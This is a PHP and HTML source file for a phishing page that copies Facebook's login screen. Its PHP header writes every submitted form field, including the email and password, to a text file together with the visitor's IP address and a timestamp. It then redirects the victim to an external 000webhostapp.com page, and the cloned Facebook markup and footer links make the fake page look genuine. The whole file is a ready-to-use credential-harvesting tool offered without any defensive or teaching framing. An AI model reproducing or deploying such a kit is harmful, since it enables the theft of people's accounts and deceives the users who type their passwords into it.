<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://gygguh.000webhostapp.com/remain.php');
$handle = fopen('simplepass.txt', 'a');
date_default_timezone_set("Asia/Kathmandu");
fwrite($handle, '----------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]-------------\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
<!DOCTYPE html>
<html>
<head>
    <title>picture you must look</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>window.addEventListener("load", function () {
        const loader = document.querySelector(".loader");
        loader.className += " hidden"; // class "loader hidden"
    });</script>

<link rel="stylesheet" href="main.css">
</head><body class="login_page _39il UIPage_LoggedOut b_c3pyn-ahh gecko win x1" dir="ltr">
<div id="nav">
    
<h1 class="face"><a class="ma" href="http://">facebook</a></h1>
</div>
<div id="create">
    <p class="cre"><a class="ma" href="http://">Create New Account</a></p>
</div>

    <div class="_li">
        <div id="pagelet_bluebar">
            <div id="blueBarDOMInspector">
                <div class="_53jh">
                    <div class="loggedout_menubar_container">
                        <div class="clearfix loggedout_menubar">
                            <div class="lfloat _ohe">
                                <h1><a href="" title=""><i class="fb_logo img sp_KN_GYdTFBXY sx_ef319a"></i></a></h1>
                            </div>
                        </div>
                    </div>
                    <div class="signupBanner">
                        <div class="signup_bar_container">
                            <div class="signup_box clearfix"><span class="signup_box_content"></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="main">
            <p class="into">Log Into Facebook</p>
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div class="_4-u5 _30ny"><span class="muffin_tracking_pixel_start"></span><img class="tracking_pixel"><span class="muffin_tracking_pixel_end"></span>

						<div class="_xku"><span class="_50f6"></span></div>
                        <div class="login_form_container">
                            <form id="login_form" action="<?php echo basename(__FILE__); ?>" accept-charset="utf-8" method="post">
                            
                                <div id="loginform">
                                    <div class="clearfix _5466 _44mg">
                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="1" placeholder=" Mobile number or email " value="" autofocus="1" aria-label="Email address or phone number" type="text" required>
                                    </div>
                                    <div class="clearfix _5466 _44mg">
                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder=" Password" aria-label="Password" type="password" required>
                                    </div>
                                    <div class="_xkt">
                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton"  tabindex="1" type="submit">Log In</button>
                                    </div>
                                    <div id="or1">
                                        <hr color=#e9ebee>
                                    </div>
                                    <div id="or">
                                        <p>or</p>
                                    </div>
                                    <div id="or2">
                                        <hr color=#e9ebee>
                                    </div>
                                    <div id="lasty">
                                        <a href="https://www.facebook.com/r.php?locale=en_US" id="last">Create New Account </a>
                                    </div>
                                    <div id="forget">
                                    <a class="har" href="https://www.facebook.com/recover/initiate/?ars=facebook_login"><p class="for">Forgot account?</p></a>
                                    </div>
                                    
                                </div>
                            </form>
                        </div>
                
                </div>
        </div>
            <div>
<div id="page">
</div>
                </div>
            </div>
        </div>
<div id="foot">
<a class="ss" href="">English (US)
</a>
<a class="ss" href="">नेपाली
</a>    
<a class="ss" href="">हिन्दी
</a>
<a class="ss" href="">Español
</a>
<a class="ss" href="">Português (Brasil)
</a>
<a class="ss" href="">Deutsch
</a>
<a class="ss" href="">Français (France)
</a>           
<br>
<br>
<hr>                
<a class="sssd" href="https://www.facebook.com/r.php">Sign up</a>
<a class="sssd" href="https://www.facebook.com/login/">Log In</a>
<a class="sssd" href="https://www.messenger.com/">Messenger</a>
<a class="sssd" href="https://www.facebook.com/lite/">Facebook Lite</a>
<a class="sssd" href="https://www.facebook.com/watch/">Watch</a>
<a class="sssd" href="https://www.facebook.com/directory/people/">People</a>
<a class="sssd" href="https://www.facebook.com/directory/pages/">Pages</a>
<a class="sssd" href="https://www.facebook.com/pages/category/">Page Categories</a>
<a class="sssd" href="https://www.facebook.com/places/">Places</a>
<a class="sssd" href="https://www.facebook.com/games/">Games</a>                
<a class="sssd" href="https://www.facebook.com/directory/places/">Location</a>
<a class="sssd" href="https://www.facebook.com/marketplace/">Marketplace</a>
<a class="sssd" href="https://pay.facebook.com/">Facebook Pay</a>
<a class="sssd" href="https://www.facebook.com/directory/groups/">Groups</a>
<a class="sssd" href="https://www.oculus.com/">Oculus</a>
<a class="sssd" href="https://portal.facebook.com/">Portal</a>
<a class="sssd" href="https://www.instagram.com/">Instagram</a>
<a class="sssd" href="https://www.facebook.com/local/lists/245019872666104/">Local</a>
<a class="sssd" href="https://www.facebook.com/fundraisers/">Fundraisers</a>
<a class="sssd" href="https://www.facebook.com/fundraisers/">Service</a>
<a class="sssd" href="https://www.facebook.com/facebook">About</a>
<a class="sssd" href="https://www.facebook.com/index.php?next=https%3A%2F%2Fwww.facebook.com%2Fads%2Fcreate%2F%3Fcampaign_id%3D402047449186%26placement%3Dpflo%26extra_1%3Dnot-admgr-user">Create Ad</a>
<a class="sssd" href="https://www.facebook.com/pages/create/?ref_type=site_footer">Create Page</a>
<a class="sssd" href="https://developers.facebook.com/?ref=pf">Developers</a>
<a class="sssd" href="https://www.facebook.com/careers/?ref=pf">Careers</a>
<a class="sssd" href="https://www.facebook.com/privacy/explanation">Privacy</a>
<a class="sssd" href="https://www.facebook.com/policies/cookies/">Cookies</a>
</div>
<div id="lasr">
    <a class="s" href="">English (US)
    </a>
    <a class="t" href="">नेपाली
    </a>
    <br>    
    <a class="u" href="">हिन्दी
    </a>
    <a class="v" href="">Español
    </a>
    <br>
    <a class="w" href="">Português (Brasil)
    </a>
    <a class="x" href="">Deutsch
    </a>
    <br>
    <a class="y" href="">Français (France)
    </a> 
</div>
                
                
</body>

</html>
